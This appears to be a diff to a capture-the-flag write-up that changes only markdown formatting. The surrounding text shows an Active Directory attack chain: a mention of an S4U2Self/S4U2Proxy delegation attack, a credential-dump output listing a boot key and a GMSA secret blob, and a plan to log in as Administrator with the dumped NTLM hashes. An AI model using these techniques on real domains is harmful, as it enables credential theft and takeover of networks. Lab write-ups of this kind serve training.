@@ -274,7 +274,7 @@ Using this TGT, I executed **getST** to perform an **S4U2Self/S4U2Proxy** attack
 ![](images-pirate/21.png)
 ![](images-pirate/22.png)
 #### Output
-> [!FAQ]- Click to expand the code ```bash
+```bash
 [*] Service RemoteRegistry is in stopped state  
 [*] Starting service RemoteRegistry  
 [*] Target system bootKey: 0x342dfe90cc4061078b79f011cd08f931  
@@ -342,7 +342,7 @@ _SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_a09ca32bc7cd2ce752ae0143bd
 _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11:01000000220100001000000012011a01b6c4083911a28350b1fd6948803650e1b1c5741f7719b1f4ff926203dcdf4ec9c0369b7b92fe10a2d7ff953bfa406a3b6786523ed82767cc8fe2734af892e98efbef2b3476759032b4ecdef34276c363b8a9410b63d809ea6ef167f5b541d73c3ac4214da22a14d97982c928d91bb971fe99d4809c1ebdeae8e769c6b3377ee1a478dffbb2ddc13318be131167d1a4a01833a4c27e0512690d73de1e59a01761ec7d40fc1882050cbf439d9cbb281a06d4bf8d85d1feb2740ec399eca0e46e36990b72b2c4a64ae009bafb3dfd264ff734b63fb922609e8c305883a75d9aef75ce37bca0910436590d9312fca46ad89a61a89bddc873197de48eab3d69b9e49800001941b01b7317000019e3df6872170000  
 [*] Cleaning up...   
 [*] Stopping service RemoteRegistry
-
+```
 ### User Flag
 
 After dumping the secrets, we were able to view NTLM hashes of each and every user, including Administrator. Now we would login as Administrator to **WEB01** machine (192.168.100.2) and get the user flag. We can do this with the following ways:
